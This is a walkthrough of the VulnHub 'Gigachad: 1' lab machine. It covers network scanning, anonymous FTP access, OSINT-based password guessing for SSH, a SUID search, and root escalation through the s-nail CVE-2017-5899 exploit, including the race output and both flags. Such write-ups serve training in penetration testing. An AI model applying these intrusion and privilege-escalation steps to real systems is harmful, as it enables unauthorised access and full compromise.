# Gigachad: 1

<p align="left">
  <img src="images/gigachad.png" width="250" height="250">
</p>

## Table of Contents
- [Url](#url)
- [Description](#description)
- [Walkthrough](#walkthrough)
  - [Network scan](#network-scan)
  - [FTP access](#ftp-access)
  - [OSINT](#osint)
  - [SSH connection](#ssh-connection)
    - [User flag](#user-flag)
  - [S-nail](#s-nail)
  - [Exploitation](#exploitation)
  - [Root access](#root-access)
    - [Root flag](#root-flag)

## Url
https://www.vulnhub.com/entry/gigachad-1,657/

## Description
get flags

difficulty: easy

about vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email for troubleshooting or questions.
This works better with VirtualBox rather than VMware 

## Walkthrough
### Network scan

First, I decided to scan the local LAN using the command ```sudo arp-scan -l```

```
┌─[parrot@parrot]─[~]
└──╼ $sudo arp-scan -l
(...)
192.168.100.204	08:00:27:be:49:17	PCS Systemtechnik GmbH
(...)
```

After finding the IP address I was interested in, i.e. ```192.168.100.204```, I decided to use the nmap tool to see if any ports were open and what services were running (along with their version). So I ran ```nmap -sV -sC -p- 192.168.100.204```

```
┌─[parrot@parrot]─[~]
└──╼ $sudo nmap -sV -sC -p- 192.168.100.204
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 22:01 CEST
Nmap scan report for 192.168.100.204
Host is up (0.00021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/kingchad.html
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:BE:49:17 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP access

In the result I got, I found some interesting information. The first is that ports 80, 21 and 22 are open. In addition, it turned out that it was possible to log in as an anonymous user using ftp. I decided to take advantage of this and logged in using the `anonymous` user.

```
┌─[parrot@parrot]─[~]
└──╼ $ftp 192.168.100.204
Connected to 192.168.100.204.
220 (vsFTPd 3.0.3)
Name (192.168.100.204:parrot): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||16318|)
150 Here comes the directory listing.
-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
226 Directory send OK.
```

Seeing an interesting file called `chadinfo` I downloaded it to my local machine.

```
ftp> get chadinfo
local: chadinfo remote: chadinfo
229 Entering Extended Passive Mode (|||57315|)
150 Opening BINARY mode data connection for chadinfo (297 bytes).
100% |***************************************|   297       15.27 KiB/s    00:00 ETA
226 Transfer complete.
297 bytes received in 00:00 (13.63 KiB/s)
```

Inside was the following message:

```
┌─[parrot@parrot]─[~]
└──╼ $cat chadinfo
PK
0
 HR���ƃchadinfoUT	�j `Zj `ux
                                  why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
PK
0
 HR���ƃ��chadinfoUT�j `ux
                         PKN�┌
```

### OSINT

We managed to get the username! Besides, it was mentioned that the password might have something to do with the `drippinchad.png` file.
Following this lead, I opened the address `http://192.168.100.204/drippinchad.png` in my browser to see what the mentioned image hides.

<p align="center">
  <img src="images/relax.png">
</p>

This time I had to test my OSINT skills. To do this, I searched the Internet using the distinctive tower in the image. I found it:

<p align="center">
  <img src="images/leanders_tower.png">
</p>

I also decided to look for it in an English-language source: https://en.wikipedia.org/wiki/Maiden%27s_Tower

It turned out that the tower is also called `The Maiden's Tower`. Knowing this information, I decided to try to introduce various combinations of simple slogans made up of the tower's name. I tried `leanders_tower`, `leanderstower`, `Leanders_Tower` (...), `maidens_tower`, `maidenstower`. Only `maidenstower` turned out to be the correct password.

### SSH connection

```
┌─[✗]─[parrot@parrot]─[~]
└──╼ $ssh chad@192.168.100.204
chad@192.168.100.204's password: 
Linux gigachad 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May  6 15:23:58 2025
chad@gigachad:~$ 
```

After logging in and checking what was in the current directory, I found the `user.txt` file, which hid the first flag:

#### User flag

```
chad@gigachad:~$ cat user.txt 
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```


### S-nail

To find the root flag, I decided to look around the system. I checked the permissions of the current user and whether he can use `sudo` (spoiler: he can't). In that case, I used the `find / -perm -4000 -type f 2>/dev/null` command. It searches for all files on the system that have the SUID bit set, and ignores error messages. With that, I came across the `/usr/lib/s-nail/s-nail-privsep` file.

```
chad@gigachad:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/s-nail/s-nail-privsep
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```

### Exploitation

I checked the version of `s-nail` - it was version `v14.8.6`. In this case, I looked to see if there were any exploits available on the Internet for this service. I found a vulnerability marked as `CVE-2017-5899` and its exploit: https://www.exploit-db.com/exploits/47172

Following this lead, I searched GitHub for code that I could execute on the machine. I found the file [`exploit.sh`](https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh)

In the absence of `curl` I downloaded it using `wget` and checked is permissions.

```
-rw-r--r-- 1 chad chad 8.4K May  7 06:17 exploit.sh 
```

To be able to execute it I elevated it using `chmod 777 exploit.sh`. After these steps I ran the script - `./exploit.sh`.

The first time the operation failed and I did not get root. The same for the second and the third. Before giving up on the idea, I decided to run the script a few more times and finally obtained root!

### Root access

```
(...)
[.] Race #517 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 14424 May  7 06:37 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh

# whoami
root
# pwd
/home/chad
```

#### Root flag

I moved to the `/root` directory where the flag was waiting for me:

```
# cd /root
# ls
chad_real_identity.png	root.txt
# cat root.txt	
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```